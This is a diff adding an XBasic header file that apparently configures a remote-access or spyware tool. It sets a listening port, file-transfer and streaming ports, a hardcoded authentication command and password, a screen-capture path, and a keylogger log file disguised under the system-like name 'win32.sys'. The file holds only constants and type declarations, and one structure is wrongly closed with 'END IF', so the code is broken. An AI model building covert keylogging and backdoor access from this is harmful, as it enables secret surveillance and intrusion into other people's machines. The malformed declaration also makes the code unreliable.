@@ -1,0 +1,149 @@
+
+$$LANG_ENGLISH          = 0x09
+$$SUBLANG_ENGLISH_UK 	= 0x02
+ 
+$$SR_LPort				= 404		' server listening port
+$$SR_FPORT				= 28010		' default file transfer port to use if none supplied
+$$SR_SPORT				= 6112		' default streaming port
+$$SR_AUTHCMD			= "A\x0DU\3T\3H\4"
+$$SR_AUTHPASS			= "12-_\\\134"
+$$SR_SCRCAP				= "tmpboc1"		' bmp screen capture path+name
+$$ST_KEYLOGF			= "win32.sys"
+$$ST_KEYLOGT			= 15000		' time (ms) per event log save 
+$$SR_PPTIME				= 500
+$$SR_PINGPONG			= 120000
+
+$$MAX_LBUFFER			= 4096		' command message listen' buffer size in bytes
+$$MAX_FBUFFER			= 104857
+$$MaxDword				= 0xFFFF
+$$TARGET_RESOLUTION		= 500
+
+$$EDITBOX_RETURN		= 402
+$$CmdLine 				= 401
+$$Edit1 				= 101
+$$Edit2 				= 102
+$$Edit3 				= 103
+
+'#define EWX_FORCE 4
+'#define EWX_LOGOFF 0
+$$EWX_POWEROFF = 8
+'#define EWX_REBOOT 2
+'#define EWX_SHUTDOWN 1
+$$EWX_FORCEIFHUNG = 16
+
+'$$TOKEN_SOURCE_LENGTH =8
+'$$TOKEN_ADJUST_DEFAULT=	128
+'$$TOKEN_ADJUST_GROUPS	=64
+'$$TOKEN_ADJUST_PRIVILEGES = 0x0020
+'$$TOKEN_ALL_ACCESS	=0xf00ff
+'$$TOKEN_ASSIGN_PRIMARY	=1
+'$$TOKEN_DUPLICATE	=2
+'$$TOKEN_EXECUTE	=0x20000
+'$$TOKEN_IMPERSONATE	=4
+'$$TOKEN_QUERY = 0x0008
+'$$TOKEN_QUERY_SOURCE=	16
+'$$TOKEN_READ	=0x20008
+'$$TOKEN_WRITE =	0x200e0
+
+'$$SE_PRIVILEGE_ENABLED_BY_DEFAULT =1
+'$$SE_PRIVILEGE_ENABLED = 0x00000002
+'$$SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000
+
+$$Priv_Name = "SeShutdownPrivilege"
+
+$$GT_DEFAULT	=	0
+$$GT_USECRLF	=	1
+$$GT_SELECTION	= 2
+
+$$WM_TRAYICON			= 1025
+$$ConsoleStatus			= 130
+$$PopUp_Exit			= 134
+
+$$IMAGE_SCREEN 			= 1
+$$IMAGE_MEMORY 			= 2
+
+$$ER_NOCONNECTION		= 1
+$$ER_WSANOWINSOCK		= 8
+$$ER_INITFAILURE		= 10
+
+'$$TH32CS_SNAPHEAPLIST = 0x00000001
+'$$TH32CS_SNAPPROCESS  = 0x00000002
+'$$TH32CS_SNAPTHREAD   = 0x00000004
+'$$TH32CS_SNAPMODULE	  = 0x00000008
+'$$TH32CS_SNAPALL	  =	0x0000000F
+'$$TH32CS_INHERIT	  = 0x80000000
+
+'$$RD                  = 0x0000    ' read file
+'$$WR                  = 0x0001    ' write file
+'$$RW                  = 0x0002    ' read/write file
+'$$WRNEW               = 0x0003    ' write new file
+'$$RWNEW               = 0x0004    ' read/write new file
+'$$NOSHARE             = 0x0000    ' share file for none
+'$$RDSHARE             = 0x0010    ' share file for read
+'$$WRSHARE             = 0x0020    ' share file for write
+'$$RWSHARE             = 0x0030    ' share file for read & write
+'$$ALL                 = -1        ' CLOSE ($$ALL)
+
+TYPE TSTR256
+	STRING * 256	.buffer
+END TYPE
+
+'TYPE TCRC
+'	XLONG		.filepos
+'	XLONG		.size
+'	XLONG		.crc32
+'END TYPE
+
+TYPE TFILE
+	STRING * 4	.ident		' should always read 'FILE'
+	XLONG		.fileid		' handle to file
+	XLONG		.start		' begin read/write
+	XLONG		.end		' read data to, ie bytes+offset to read/write
+	XLONG		.size		' total data to read/write/send
+	XLONG		.wmode		' write mode
+	XLONG		.error		' 0 = no error,1 = unable to open file or file does not exist
+END TYPE
+
+TYPE TSERVER
+	STRING * 64		.addressb			' connect(ed) to this address
+	XLONG			.port				' connect(ed) to this port
+	XLONG			.socket				' 
+'	XLONG			.threadid			'
+END IF
+
+TYPE TSPROFILE
+	XLONG			.active				' $$TRUE/$$FALSE
+	TSERVER			.server				' server details
+END TYPE
+
+
+TYPE TRECT
+  XLONG     .left
+  XLONG     .top
+  XLONG     .right
+  XLONG     .bottom
+END TYPE
+
+TYPE FILE_INFO
+  XLONG        .attributes
+  XLONG        .createTimeLow
+  XLONG        .createTimeHigh
+  XLONG        .accessTimeLow
+  XLONG        .accessTimeHigh
+  XLONG        .modifyTimeLow
+  XLONG        .modifyTimeHigh
+  XLONG        .sizeHigh
+  XLONG        .sizeLow
+  XLONG        .res0
+  XLONG        .res1
+  STRING*260   .name
+  STRING*14    .alternateName
+END TYPE
+
+TYPE FSIZE
+	UNION
+		ULONG .sizeh
+		ULONG .sizel
+		GIANT .tsize
+	END UNION
+END TYPE
